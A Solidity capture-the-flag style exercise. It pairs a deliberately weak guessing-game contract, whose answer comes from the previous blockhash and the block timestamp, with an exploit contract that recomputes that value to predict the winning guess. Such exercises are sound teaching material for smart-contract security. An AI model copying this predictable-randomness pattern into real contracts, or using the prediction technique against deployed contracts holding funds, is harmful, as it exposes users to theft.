// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract GuessNewNumber {
    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable returns (bool pass) {
        require(msg.value == 1 ether);
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));

        if (n == answer) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Fail to send to msg.sender");
            pass = true;
        }
    }
}

//Write your exploit codes below
contract ExploitContract {
    GuessNewNumber public guessNewNumber;
    uint8 public answer;

    /**
     * The exploit is a result of 
     * 1. low number of values that `uint8` holds [0, 256).
     * 2. deterministic values of `blockhash` and `blocktimestamp`
     * That means we can compute hash of block and timestamp during runtime and see if
     * it matches against the `uint8` value
     */
    function Exploit() public view returns (uint8) {
        for (uint i; i < 256;) {
            uint8 hashed = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
            if (hashed == uint8(i)) {
                return uint8(i);
            }
            unchecked {
                ++i;
            }
        }
        return answer;
    }
}